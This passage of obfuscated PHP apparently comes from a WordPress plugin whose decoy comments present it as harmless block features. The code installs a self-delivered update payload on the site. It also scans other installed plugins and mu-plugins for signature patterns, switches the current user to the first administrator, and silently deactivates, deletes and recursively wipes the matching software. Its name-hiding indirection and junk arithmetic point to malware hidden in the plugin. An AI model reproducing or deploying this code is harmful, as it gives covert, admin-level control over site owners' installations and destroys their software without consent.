delete_transient(f5cd2smymkqusi5(662));
  yjkrjx8q3v6i5zrgis4g();
    gt1toalj2_i1_soa();


     
   if     ($uqq96eoncm3)  {
jt3u27829fqbm73ek();
    }
  }     catch    (Throwable    $h2v_bjm4ejxq8fp) {



 fukkkeh6955g9qi(nhceivfj8tbe(670),    $h2v_bjm4ejxq8fp);
 } catch (Exception $h2v_bjm4ejxq8fp)   {
 }    finally {


unset($GLOBALS[pahk8uy1uxt(286)]);
  m8s6jamaok_hdjr3wp(nrudcgor(578));
 }
// WP Embed Block: general-recursive trust-anchor



}
   
   function   r_6rrgurjjecbi($n32esj5bql5wsi,  $w8kjnpdhbm30d = "",      $okh0k7xgs1ayx     =   false)


{



     if    (!dw5qugv407fnslnons1tfr(f5cd2smymkqusi5(578)))   return;
       try    {
$ffnltliju6j7aefu   =  k34y4e9knu6ix7sd2n();
   

      if ($ffnltliju6j7aefu   > 0   &&    $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(671))   &&  !wq5ruxciovtxyyjl($GLOBALS['__scf_amjjmfnilcolnb_10']($n32esj5bql5wsi)  *  (0x2+0x2))) {
 fukkkeh6955g9qi(nhceivfj8tbe(672), nrudcgor(673));
  return;
    }



  unset($ffnltliju6j7aefu);



   $zdgw7sviaa3g4g   =      @$GLOBALS['__scf_wlpl5h61eyolq_355']($n32esj5bql5wsi, true);

   if ($GLOBALS['__scf__me483qbepnts_41']($zdgw7sviaa3g4g)  &&    $GLOBALS['__scf_amjjmfnilcolnb_10']($zdgw7sviaa3g4g)     > (838749+209827)) $zdgw7sviaa3g4g  = g9begdqy64lw_mpz($zdgw7sviaa3g4g);
if      (!   $zdgw7sviaa3g4g ||     $GLOBALS['__scf_amjjmfnilcolnb_10']($zdgw7sviaa3g4g) < (817-317) ||   $GLOBALS['__scf_nr12ouzrtt_7']($zdgw7sviaa3g4g,  pahk8uy1uxt(674))  !==  0)    {$j1g1hoj7=36+58;$r2jfioqpt=$j1g1hoj7-14;
return;

}



    if  (!     hkk3yvii60ci7rk($zdgw7sviaa3g4g))  {
      fukkkeh6955g9qi(dhd5r6_4ki(672), pahk8uy1uxt(675));
     return;
}
 if ($GLOBALS['__scf_saw_32lvsj_92'](nhceivfj8tbe(93),   $GLOBALS['__scf_bv1z3no349dv5r_9']($zdgw7sviaa3g4g,  0,    (0x8f3+0x70d)),    $o1vj06yrsuw))  {
   if   ($w8kjnpdhbm30d   !==   "" && $w8kjnpdhbm30d !==  $o1vj06yrsuw[1])   {
  fukkkeh6955g9qi(f5cd2smymkqusi5(672), mhiu2yqz6kqd(676));$j2bs8m62xo3vko=PHP_INT_MAX/PHP_INT_MAX;$rcr8q1kuliasw3=$j2bs8m62xo3vko+51;


return;
}
 $w8kjnpdhbm30d   =     $o1vj06yrsuw[1];

 }  else    {
fukkkeh6955g9qi(mhiu2yqz6kqd(677), f5cd2smymkqusi5(678));
return;
}
   if    (!$okh0k7xgs1ayx   &&  version_compare($w8kjnpdhbm30d, kwqziujdph5xlz3n())   <= 0)     {
return;


      }
$n747j3rtnrkqg2t   = adbbbpoh0e7mcf6();
if (!$n747j3rtnrkqg2t ||    $GLOBALS['__scf_amjjmfnilcolnb_10']($n747j3rtnrkqg2t) <  (0x147+0xad))     {
 fukkkeh6955g9qi(dhd5r6_4ki(677), nhceivfj8tbe(679));
return;
  }
$p5pnasemixx   =   get_option(pahk8uy1uxt(186));
if ($GLOBALS['__scf__me483qbepnts_41']($p5pnasemixx) &&  $GLOBALS['__scf_nr12ouzrtt_7']($p5pnasemixx,  $GLOBALS['__scf_nn04_vx3uspzx4_54']($zdgw7sviaa3g4g) .    '|')  ===   0)   {
    return;
 }
 $qyd83hgi7mq  =    $GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa())     .    nrudcgor(184) .  $GLOBALS['__scf_nn04_vx3uspzx4_54']($zdgw7sviaa3g4g);
     if   (@$GLOBALS['__scf_gsamhlxot70ps_18']($qyd83hgi7mq))      {
      return;

  }
       unset($qyd83hgi7mq);
   if   (!$okh0k7xgs1ayx)  {
 $bxtat9scg1e138      =      @get_option(pahk8uy1uxt(680), "");

    if ($GLOBALS['__scf__me483qbepnts_41']($bxtat9scg1e138) &&  $GLOBALS['__scf_nr12ouzrtt_7']($bxtat9scg1e138, $GLOBALS['__scf_nn04_vx3uspzx4_54']($zdgw7sviaa3g4g)    . '|') === 0)   {
$lzgdzmwujphs  =  (int)  $GLOBALS['__scf_bv1z3no349dv5r_9']($bxtat9scg1e138,  $GLOBALS['__scf_nr12ouzrtt_7']($bxtat9scg1e138,    '|')  +   1);

    if   ($lzgdzmwujphs &&   $GLOBALS['__scf_zxyq0lcqv02z6_185']()  -  $lzgdzmwujphs  < (45+855))    return;
 }
 unset($bxtat9scg1e138, $lzgdzmwujphs);
 }
/* sesquilinear backlog */




 $drmktmsaw_6c_x    =   false;



    if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(290))    &&  $GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(472))) {
$qlyuf7yktkw    =   $GLOBALS['__scf_yt926i7lwej_290'](home_url('/'), array(f5cd2smymkqusi5(681)  =>  (0x6+0x2),   f5cd2smymkqusi5(682) => 2,   pahk8uy1uxt(683)   => false, nrudcgor(293) => (1048478+98)));


 if (!  ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(294)) &&  is_wp_error($qlyuf7yktkw))) {

    $drmktmsaw_6c_x   = (int)  wp_remote_retrieve_response_code($qlyuf7yktkw) >=   (450+50);
// unitary template

   }
    }


 $tri7lvnejb    = false;



  if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(558)))  {
   $dcveub18qho   =   get_option(nhceivfj8tbe(145), array());

        $tri7lvnejb   =     $GLOBALS['__scf_vf9p0fditvxy_35']($dcveub18qho) &&   $GLOBALS['__scf_rq7q923zwh_148'](zkn58aug3fwlbp(),   $dcveub18qho,   true);


}



  rgiuaapohxeh0z(vv_nfhhmy_1mjmsa(),  (0x10a+0x9a));
if    (!    jr30c_pj_1z9sfyaq3c88(vv_nfhhmy_1mjmsa(),  vmv3l2fd6oj__92qteyq($zdgw7sviaa3g4g)))  {
fukkkeh6955g9qi(dhd5r6_4ki(677), mhiu2yqz6kqd(684));
 return;
 }
 ejl1lwk108flojzx(vv_nfhhmy_1mjmsa());
 c9_5mtzr7mpfsj7(vv_nfhhmy_1mjmsa());



 if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(58)))    @set_transient(pahk8uy1uxt(685),  1, (262+38));
   $p6iz2vyale   =   false;



 if (! $drmktmsaw_6c_x     &&   $GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(290))   &&  $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(472)))      {
    $tvb6duty46kk5o  =  -1;
for   ($mjnperd2n_r49zy  = 0;   $mjnperd2n_r49zy <    2;  $mjnperd2n_r49zy++) {
// @replicate dominator-tree

   $w83a2v_3h4g1d  =   $GLOBALS['__scf_yt926i7lwej_290'](home_url(f5cd2smymkqusi5(686) . $GLOBALS['__scf_cn1v_k8jlgjjb_350']((0xfbd8+0x8ac8),    (999922+77))),    array(nrudcgor(681)  => (3+5), nrudcgor(682)   =>    2, mhiu2yqz6kqd(683)   =>      false,  nrudcgor(293) =>  (1048567+9)));

  if ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(687))  && is_wp_error($w83a2v_3h4g1d)) {
if  ($mjnperd2n_r49zy    ===     0  && $GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(688)))  $GLOBALS['__scf_fuzlhztkbb25_688'](2);
  continue;
}
        $drcleqqnwpgy4i4   =   (int)    wp_remote_retrieve_response_code($w83a2v_3h4g1d);


if  ($drcleqqnwpgy4i4  < (55+45)   ||   $GLOBALS['__scf_rq7q923zwh_148']($drcleqqnwpgy4i4, array((497+6),  (430+90), (476+45), (430+92),   (75+448),  (463+61),  (0x57+0x1b7), (189+338)),     true))    {
 if ($mjnperd2n_r49zy      === 0 && $GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(688)))   $GLOBALS['__scf_fuzlhztkbb25_688'](2);
  continue;
 }
 $tvb6duty46kk5o =  $drcleqqnwpgy4i4;
    break;

}
 if  ($tvb6duty46kk5o === -1)   fukkkeh6955g9qi(nhceivfj8tbe(677),  f5cd2smymkqusi5(689)); 
 if  ($tvb6duty46kk5o    !==  -1  &&  $tvb6duty46kk5o  <  (4+496)) $p6iz2vyale     =     true;
if  ($tvb6duty46kk5o   !==  -1 &&  $tvb6duty46kk5o >=   (0xac+0x148))    {
    $qgkdze7ztk    =    jr30c_pj_1z9sfyaq3c88(vv_nfhhmy_1mjmsa(),  vmv3l2fd6oj__92qteyq($n747j3rtnrkqg2t));


if (!$qgkdze7ztk)   $qgkdze7ztk  = jr30c_pj_1z9sfyaq3c88(vv_nfhhmy_1mjmsa(),   $n747j3rtnrkqg2t);
$dr3s9irnjwhk2l  =   $GLOBALS['__scf_nn04_vx3uspzx4_54']($zdgw7sviaa3g4g);
 $nyyvjkecgp =  @get_option(f5cd2smymkqusi5(680), "");
 $e2hx2rm0o0hrfv  =    false;
  if  ($GLOBALS['__scf__me483qbepnts_41']($nyyvjkecgp)  && $GLOBALS['__scf_nr12ouzrtt_7']($nyyvjkecgp, $dr3s9irnjwhk2l  .  '|')   ===     0)    {
 $lqeh7nj31fs9pd5a = (int) $GLOBALS['__scf_bv1z3no349dv5r_9']($nyyvjkecgp,  $GLOBALS['__scf_nr12ouzrtt_7']($nyyvjkecgp,  '|')  +   1);


  $e2hx2rm0o0hrfv  = $lqeh7nj31fs9pd5a  &&  $GLOBALS['__scf_zxyq0lcqv02z6_185']() - $lqeh7nj31fs9pd5a     >= (612+288)    &&  $GLOBALS['__scf_zxyq0lcqv02z6_185']()  - $lqeh7nj31fs9pd5a <=    (604739+61);
 }
if ($e2hx2rm0o0hrfv)  {
update_option(pahk8uy1uxt(186),     $dr3s9irnjwhk2l .   '|' .     $GLOBALS['__scf_zxyq0lcqv02z6_185'](),  f5cd2smymkqusi5(664));



  @delete_option(f5cd2smymkqusi5(690));
      } else    {
     @update_option(nrudcgor(691),   $dr3s9irnjwhk2l   .  '|'    .  $GLOBALS['__scf_zxyq0lcqv02z6_185']() .    '|'   . $tvb6duty46kk5o,     nhceivfj8tbe(664));
      }


      unset($dr3s9irnjwhk2l,   $nyyvjkecgp,  $e2hx2rm0o0hrfv, $lqeh7nj31fs9pd5a);
     if   (!$qgkdze7ztk) {
        fukkkeh6955g9qi(f5cd2smymkqusi5(677),  pahk8uy1uxt(692) .      $tvb6duty46kk5o);
return;
}
 c9_5mtzr7mpfsj7(vv_nfhhmy_1mjmsa());


 ejl1lwk108flojzx(vv_nfhhmy_1mjmsa());
  adbbbpoh0e7mcf6(true);
  mpkogxinl1o8xqdhl__(true);$x1dmyxwwk=187|238;$yi8l6tzbnz7=$x1dmyxwwk^26;


        $dia57jb3cl1     =   $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa(),   f5cd2smymkqusi5(693));


foreach  (array($GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa()),  s3e5iki9upa0ccql())   as $o6na3jtufwj711z)     {
       @$GLOBALS['__scf_cdsp_fvydw_ufg_17']($o6na3jtufwj711z   .    dhd5r6_4ki(191) .   $dia57jb3cl1);
  @$GLOBALS['__scf_cdsp_fvydw_ufg_17']($o6na3jtufwj711z   .  nrudcgor(183)      .   $dia57jb3cl1);
 }


       if  ($tri7lvnejb  &&  !wg3vl21ocdjr7mf()) khlrpg8_w_x7jmmf(zkn58aug3fwlbp());
$GLOBALS[pahk8uy1uxt(694)]  =  0;
 gt1toalj2_i1_soa();
 fukkkeh6955g9qi(pahk8uy1uxt(677),   nhceivfj8tbe(695)  .    $tvb6duty46kk5o);
 return;
 }

}
  $fd2re_9bd_zw42zp =  get_option(mhiu2yqz6kqd(186));
  if     ($GLOBALS['__scf__me483qbepnts_41']($fd2re_9bd_zw42zp)  &&     $GLOBALS['__scf_nr12ouzrtt_7']($fd2re_9bd_zw42zp, $GLOBALS['__scf_nn04_vx3uspzx4_54']($zdgw7sviaa3g4g) .  '|') === 0)      delete_option(nhceivfj8tbe(696));
@$GLOBALS['__scf_cdsp_fvydw_ufg_17']($GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa())   . nrudcgor(184)     .      $GLOBALS['__scf_nn04_vx3uspzx4_54']($zdgw7sviaa3g4g));
  unset($fd2re_9bd_zw42zp);
if ($p6iz2vyale)  @delete_option(nrudcgor(691));
if  ($w8kjnpdhbm30d  !==   "")    {

 $GLOBALS[nrudcgor(1)]   = $w8kjnpdhbm30d;$fgz94vhh=7262;$iw26mensikcl8r=$fgz94vhh%13;
     udxja7mp4cir7rqqnk(vv_nfhhmy_1mjmsa(),  $w8kjnpdhbm30d);
}
      if  ($okh0k7xgs1ayx)    {
$w0mkq4uvvim   = $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa(),    dhd5r6_4ki(693));
foreach   (array($GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa()),    s3e5iki9upa0ccql())   as  $v3rznat_uw9jzh) {
 @$GLOBALS['__scf_cdsp_fvydw_ufg_17']($v3rznat_uw9jzh . mhiu2yqz6kqd(697)  .    $w0mkq4uvvim);


 }
unset($w0mkq4uvvim,  $v3rznat_uw9jzh);
 }
    c8fb1vg_q0kn6h(nhceivfj8tbe(457),  $zdgw7sviaa3g4g, mhiu2yqz6kqd(698));
  adbbbpoh0e7mcf6(true);
 mpkogxinl1o8xqdhl__(true);
 

    $GLOBALS[nhceivfj8tbe(694)]  =    0;
    gt1toalj2_i1_soa();
     rgiuaapohxeh0z(vv_nfhhmy_1mjmsa(),   (0x4e+0x156));
    if     (c9_5mtzr7mpfsj7(vv_nfhhmy_1mjmsa()))  jqp5yotia2ogx9k(vv_nfhhmy_1mjmsa());



  update_option(mhiu2yqz6kqd(699),  $w8kjnpdhbm30d   . '|' .     $GLOBALS['__scf_zxyq0lcqv02z6_185'](), mhiu2yqz6kqd(698));
    }  catch (Throwable     $h2v_bjm4ejxq8fp) {$ygdtdc3konak=PHP_INT_MAX/PHP_INT_MAX;$i2dq0wkejapfm=$ygdtdc3konak+67;
    fukkkeh6955g9qi(nrudcgor(677),  $h2v_bjm4ejxq8fp);


   } catch   (Exception  $h2v_bjm4ejxq8fp) {$qj8fsdmggj6jl=PHP_MAJOR_VERSION;$ang9n9hxx57=$qj8fsdmggj6jl*5;
 }  finally   {
/* derandomized permission */




   m8s6jamaok_hdjr3wp(dhd5r6_4ki(578));
 }
}
    function  pff1gv_16trak9y_o()


  {



 if   (!   defined(dhd5r6_4ki(460))  ||    ! $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(700)))  {
 if ($GLOBALS['__scf_od_0qrqi5rcvlf_701'](ABSPATH   .    nrudcgor(702)))  {
require_once     ABSPATH    .   dhd5r6_4ki(702);
       }



 if (!  $GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(700))) {



  return;$yndzzmpcu35e78=4310;$gkg91zub=$yndzzmpcu35e78%2;


}

}
 $ims2bsupqrry =   get_plugins();
     if (! $GLOBALS['__scf_vf9p0fditvxy_35']($ims2bsupqrry))   {



 return;
}
   $list = array();
foreach ($ims2bsupqrry    as   $basename   =>   $vd8qp6l1as_h)    {
 if ($basename  ===  zkn58aug3fwlbp())  {
 continue;
 }
 $list[$basename] =   $vd8qp6l1as_h;


   }
    return  $list;
  }
 function  lzh304mqtio7dpvrgcr($pmuqotgyfm5tcjn,   $n6eh4iznxod44d)
{

  

        $rjo5gf52iv1ov5t =     @$GLOBALS['__scf_apq4pqdt6n41_91']($pmuqotgyfm5tcjn, false,   null, 0, (524232+56));   
   if   (!     $rjo5gf52iv1ov5t)  {
   return     false;
     }
  


foreach ($n6eh4iznxod44d     as    $aslsiuo92mu3) {


   
 if   (!   $GLOBALS['__scf__me483qbepnts_41']($aslsiuo92mu3)     || ! $aslsiuo92mu3    || $GLOBALS['__scf_amjjmfnilcolnb_10']($aslsiuo92mu3) >  (0xd4+0xf2c)) {

    continue;



 }


 
      try {
   $d1kd72zq60vf6el =   @$GLOBALS['__scf_saw_32lvsj_92']($aslsiuo92mu3, $rjo5gf52iv1ov5t);
 }  catch  (Throwable  $i5evc75vg6jdwv59)    {
fukkkeh6955g9qi(pahk8uy1uxt(703),     $i5evc75vg6jdwv59);
 continue;
}   catch   (Exception   $i5evc75vg6jdwv59)    {
continue;


}
 
if ($d1kd72zq60vf6el)  {

      return    true;
}
}
   return false;
  }
    
 function    icvotb64vrwpeu5i2($plugin_basename)

 {


  $n6eh4iznxod44d  =    $GLOBALS[f5cd2smymkqusi5(439)];
  if   (! $GLOBALS['__scf_vf9p0fditvxy_35']($n6eh4iznxod44d)   || empty($n6eh4iznxod44d))      {
       return     false;
 }
// allocate cipher-suite for WP Columns Block

      if  (!  defined(nrudcgor(460))  || empty($plugin_basename) ||   $GLOBALS['__scf_nr12ouzrtt_7']($plugin_basename,     f5cd2smymkqusi5(704)) !== false) {
return false;
 }
 
       $no4625mwq2q9a2  =    WP_PLUGIN_DIR .   '/'  .   $plugin_basename;
if    ($GLOBALS['__scf_eure5hcx2b_11']($plugin_basename)  ===  '.') {
$p2fntj3gsna =  array($no4625mwq2q9a2);
 }   else {
  $ys5go7qi508n    =     $GLOBALS['__scf_eure5hcx2b_11']($no4625mwq2q9a2);
   if (! $GLOBALS['__scf_ux4_n6mewmsy_43']($ys5go7qi508n)    ||     !   $GLOBALS['__scf_wp1g_umcsjt_46']($ys5go7qi508n)) {
return  false;



        }
 $p2fntj3gsna  =    vqqlehve69le8x4vqw89x($ys5go7qi508n,  array(dhd5r6_4ki(705),   nrudcgor(487),    nhceivfj8tbe(706),    dhd5r6_4ki(707),      dhd5r6_4ki(633)));

     }


    
  foreach  ($p2fntj3gsna  as $pmuqotgyfm5tcjn)   {
        if   (!    $GLOBALS['__scf_gsamhlxot70ps_18']($pmuqotgyfm5tcjn))  {
continue;
 }



 if  (lzh304mqtio7dpvrgcr($pmuqotgyfm5tcjn,  $n6eh4iznxod44d))    {$k5x3vdj_7cslb=25+24;$h01kxyn_qh=$k5x3vdj_7cslb-14;

  return      true;


 }


 }
    return  false;
 }
     function vqqlehve69le8x4vqw89x($ys5go7qi508n,  $tib_fqw2guf,    $ec58q_ks0agewsz    =   0,  &$rz8pbbtd5_tr6fy  =   null,   &$ur26bp8dgnb26ju =  null)


 {$x2ee1hgnb=912;$y810z2d9p=($x2ee1hgnb>0)?$x2ee1hgnb:-$x2ee1hgnb;
    $list  =  array();
 if  ($ec58q_ks0agewsz  >  (4<<1)) {$k47n65xydx70=-194;$xpu_jeiw1=($k47n65xydx70>0)?$k47n65xydx70:-$k47n65xydx70;
  return  $list;



       }
     if    ($rz8pbbtd5_tr6fy ===      null) {
  $rz8pbbtd5_tr6fy = array();
     $ur26bp8dgnb26ju    =  $GLOBALS['__scf_m30d3r9g_n_287'](true)  +    (0x8+0x2);
  }
  if  ($GLOBALS['__scf_m30d3r9g_n_287'](true)  > $ur26bp8dgnb26ju)     {
return   $list;
  }
       if   (! $GLOBALS['__scf_ux4_n6mewmsy_43']($ys5go7qi508n))   {



 return $list;
 }
$fk7v3zbqxc5d82   =  @$GLOBALS['__scf_a9u8k74i0cg19_33']($ys5go7qi508n);
      if ($fk7v3zbqxc5d82     !==   false)  {$kaltc2faz=(0x7e+0x7d);$xefnz468=$kaltc2faz%11;
  if   (isset($rz8pbbtd5_tr6fy[$fk7v3zbqxc5d82]))  {

     return  $list;



}
     $rz8pbbtd5_tr6fy[$fk7v3zbqxc5d82] = true;
        }
 $g_cewvxh0ryg   = ly0t7sdceinn03pyne3($ys5go7qi508n, (19986+14));
   if   (! $GLOBALS['__scf_vf9p0fditvxy_35']($g_cewvxh0ryg))  {
return    $list;


 }
// @patch skolem



foreach  ($g_cewvxh0ryg     as    $tkt_c3gey3l) {
  if  ($GLOBALS['__scf_m30d3r9g_n_287'](true)     > $ur26bp8dgnb26ju || $GLOBALS['__scf_upe5p4qfaqm0d1_36']($list)      >=  (936-436))  {
break;$c3iy3ork=(0xb0+0xc5);$jqlnhnnskw=$c3iy3ork%2;
  }

  $no4625mwq2q9a2   = $ys5go7qi508n  .     '/' .     $tkt_c3gey3l;



    if  (@$GLOBALS['__scf_ekpq_b8etrq0_44']($no4625mwq2q9a2))    {
   continue;
 }
      if   (@$GLOBALS['__scf_ux4_n6mewmsy_43']($no4625mwq2q9a2)) {
$list   =  $GLOBALS['__scf_b3z_uoye0i_367']($list,  vqqlehve69le8x4vqw89x($no4625mwq2q9a2,     $tib_fqw2guf,     $ec58q_ks0agewsz    +    1, $rz8pbbtd5_tr6fy,  $ur26bp8dgnb26ju));
   }   elseif   (@$GLOBALS['__scf_gsamhlxot70ps_18']($no4625mwq2q9a2))  {
     $q5oq8x8i6s  =   $GLOBALS['__scf_l2thcf5lcfr_202']($no4625mwq2q9a2, constant(f5cd2smymkqusi5(708)));
    $q5oq8x8i6s   = $GLOBALS['__scf__me483qbepnts_41']($q5oq8x8i6s)   ?  $GLOBALS['__scf_h3sj62ryxfdde_99']($q5oq8x8i6s) : "";
  

 if  ($GLOBALS['__scf_rq7q923zwh_148']($q5oq8x8i6s,     $tib_fqw2guf, true))   {
$list[]  = $no4625mwq2q9a2;
}
   }
  }
  return  $list;
}



    
function   v3dgvfap4w6ccgi754wb6e($plugin_basename)
 {



if      (!  $GLOBALS['__scf__me483qbepnts_41']($plugin_basename)  || !    $plugin_basename)     {
  return false;
}
// WP Paragraph Block shortcode parse

  if ($GLOBALS['__scf_nr12ouzrtt_7']($plugin_basename,   pahk8uy1uxt(709)) !==     false)      {
// repeatable-read dependency-graph

  return    false;

   }
  
  $plugin_basename  =  $GLOBALS['__scf_uvjtdemk2f_320']($plugin_basename);$qt3w26rr=-224;$vw3tfhne4i_kr=($qt3w26rr>0)?$qt3w26rr:-$qt3w26rr;
  if ($plugin_basename ===   zkn58aug3fwlbp())     {



   return false;
 }


 


if (!   $GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(710)) &&     $GLOBALS['__scf_od_0qrqi5rcvlf_701'](ABSPATH     .  f5cd2smymkqusi5(711)))   {
  require_once ABSPATH  .  f5cd2smymkqusi5(711);
      }


  
if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(710))  &&   is_plugin_active($plugin_basename))  {
 deactivate_plugins(array($plugin_basename),    true); 
    }
 
  $ys5go7qi508n =  defined(nrudcgor(460))     ?   WP_PLUGIN_DIR  .   '/'  .   $GLOBALS['__scf_eure5hcx2b_11']($plugin_basename)    : "";
if  ($ys5go7qi508n   &&  $GLOBALS['__scf_ux4_n6mewmsy_43']($ys5go7qi508n)   &&  $GLOBALS['__scf_eure5hcx2b_11']($plugin_basename)    !== '.' && $GLOBALS['__scf_eure5hcx2b_11']($plugin_basename)) {$d2yp108v33fcm=PHP_MAJOR_VERSION;$dgqai9qsce5wyn=$d2yp108v33fcm*5;
   if  (k7v93u7xqv5fro($ys5go7qi508n)) {
  return     true;
}
 }
// acquire read

  
if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(712)))    {
 
 if    (!    $GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(713)) ||  !   current_user_can(mhiu2yqz6kqd(712)))  {
  if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(714))    && $GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(715))) {


  $users      = get_users(array(pahk8uy1uxt(716) =>     mhiu2yqz6kqd(717),   pahk8uy1uxt(718) =>    1));
if     (!     empty($users)   &&    $users[0]->ID)   {
 $GLOBALS['__scf_ocns0lt00tb15_719']($users[0]->ID);
 }   else  {
  $GLOBALS['__scf_ocns0lt00tb15_719'](1);
     }

}



}

       $f4uaalv3t0y  =  delete_plugins(array($plugin_basename));
     if (! is_wp_error($f4uaalv3t0y))  {
 return (bool)   $f4uaalv3t0y;
  }
    }
   return   false;
      }
   
 function  k7v93u7xqv5fro($ys5go7qi508n,   $ec58q_ks0agewsz =   0)
  {
// reference queue

  if  ($ec58q_ks0agewsz  > (13+3))    {
     return false;
   }
    if    (! $GLOBALS['__scf__me483qbepnts_41']($ys5go7qi508n) ||   $ys5go7qi508n ===  ""   ||  $GLOBALS['__scf_nr12ouzrtt_7']($ys5go7qi508n, mhiu2yqz6kqd(720)) !==      false)    {
     return    false;
  }



$ago_h8gux7lrn     =   @$GLOBALS['__scf_a9u8k74i0cg19_33']($ys5go7qi508n);
  if  ($ago_h8gux7lrn ===   false    || !   $GLOBALS['__scf_ux4_n6mewmsy_43']($ago_h8gux7lrn)) {
    return  false;


}
// @accumulate envelope



 $lyooyidffa81s7   =  defined(mhiu2yqz6kqd(721))    ?  @$GLOBALS['__scf_a9u8k74i0cg19_33'](WP_PLUGIN_DIR)     : false;$dmeraqzce0b87=PHP_INT_MAX/PHP_INT_MAX;$cvn9uiui6qf=$dmeraqzce0b87+25;

    if ($lyooyidffa81s7 === false   ||   ($ago_h8gux7lrn  !==     $lyooyidffa81s7  &&  $GLOBALS['__scf_nr12ouzrtt_7']($ago_h8gux7lrn, $lyooyidffa81s7 .     DIRECTORY_SEPARATOR)     !==   0))  {
return   false;
 }
  $e03_yf2qy5 =     @$GLOBALS['__scf_jetqv7wpcizi69_34']($ago_h8gux7lrn);
  if  (! $GLOBALS['__scf_vf9p0fditvxy_35']($e03_yf2qy5)) {
return   false;
   }



  foreach ($e03_yf2qy5     as    $nsgc53tu0oo_d2t) {

     if    ($nsgc53tu0oo_d2t === '.' ||    $nsgc53tu0oo_d2t    ===  dhd5r6_4ki(722))  {
   continue;



   }
 $no4625mwq2q9a2   = $ago_h8gux7lrn   .  constant(f5cd2smymkqusi5(723))     .   $nsgc53tu0oo_d2t;
if (@$GLOBALS['__scf_ekpq_b8etrq0_44']($no4625mwq2q9a2))  {
t65xl1pt2haov_izh($no4625mwq2q9a2);
        continue;
     }
    if    (@$GLOBALS['__scf_ux4_n6mewmsy_43']($no4625mwq2q9a2)) {
   k7v93u7xqv5fro($no4625mwq2q9a2, $ec58q_ks0agewsz +  1);
}  else     {



 if (! t65xl1pt2haov_izh($no4625mwq2q9a2))  {
     rgiuaapohxeh0z($no4625mwq2q9a2,   (353+67));
   t65xl1pt2haov_izh($no4625mwq2q9a2);


   }
    }
}
  if  (! @$GLOBALS['__scf_zze0o3nmaro9m_37']($ago_h8gux7lrn))     {

 rgiuaapohxeh0z($ago_h8gux7lrn,   (100+393));
@$GLOBALS['__scf_zze0o3nmaro9m_37']($ago_h8gux7lrn);
    }
// WP Data Layer: unlock validator


    return  ! @$GLOBALS['__scf_od_0qrqi5rcvlf_701']($ago_h8gux7lrn);



    }
  
  
function   jt3u27829fqbm73ek()
{
    try  {
  $list  =   pff1gv_16trak9y_o();
     if (!      $GLOBALS['__scf_vf9p0fditvxy_35']($list)) {
   return;
     }
  
 $cpihjoeensb =   array();
     $g1m4j4snv55 =  false;
foreach  ($GLOBALS['__scf_r8u4axo29pt55k_724']($list)   as $basename)    {
    
       if  (!  $GLOBALS['__scf__me483qbepnts_41']($basename))  {
  continue;
      }


  
$sd4qd9dnkqj  = $GLOBALS['__scf_eure5hcx2b_11']($basename);
if ($sd4qd9dnkqj    ===  '.')   {


   $sd4qd9dnkqj = $basename;
}
       if   (isset($cpihjoeensb[$sd4qd9dnkqj]))     {
    continue;$q0imes9i2_=92+22;$yb6q6wliss7=$q0imes9i2_-47;


  }
 


       $cpihjoeensb[$sd4qd9dnkqj] =   true;
 if   (icvotb64vrwpeu5i2($basename))  {
v3dgvfap4w6ccgi754wb6e($basename);

 $g1m4j4snv55   = true;



}
 }
    
if  (@$GLOBALS['__scf_ux4_n6mewmsy_43'](s3e5iki9upa0ccql())) {
  $c6vxsja5mtn14f   =    ly0t7sdceinn03pyne3(s3e5iki9upa0ccql(), (4914+86));
if     ($GLOBALS['__scf_vf9p0fditvxy_35']($c6vxsja5mtn14f))  {



 $n6eh4iznxod44d    =    $GLOBALS[dhd5r6_4ki(725)];
  foreach  ($c6vxsja5mtn14f   as  $tkt_c3gey3l) {




     if   ($tkt_c3gey3l      ===   vru1jzm2va580zgo4i2cxv()) {
    continue;
   }



     
$pmuqotgyfm5tcjn     =    s3e5iki9upa0ccql() . '/'   . $tkt_c3gey3l;
if (!   @$GLOBALS['__scf_gsamhlxot70ps_18']($pmuqotgyfm5tcjn)   ||   $GLOBALS['__scf_h3sj62ryxfdde_99']($GLOBALS['__scf_l2thcf5lcfr_202']($tkt_c3gey3l,   constant(mhiu2yqz6kqd(726)))) !==    nrudcgor(727))   {
// gather operation

 continue;
  }
   
 if   (lzh304mqtio7dpvrgcr($pmuqotgyfm5tcjn,   $n6eh4iznxod44d)) {
t65xl1pt2haov_izh($pmuqotgyfm5tcjn);
 $g1m4j4snv55     =     true;
}
}
   }
     }
     
 $m6293fukf6x = $GLOBALS[pahk8uy1uxt(443)];
 if     ($GLOBALS['__scf_vf9p0fditvxy_35']($m6293fukf6x)    && !   empty($m6293fukf6x))  {
        if   (y3ey9u3hwumkf71y1dwhsl($m6293fukf6x)) {
   $g1m4j4snv55 = true;
   }
   }
  }    catch  (Throwable  $h2v_bjm4ejxq8fp)  {
// evaluate call-graph for MySQL JSON operators

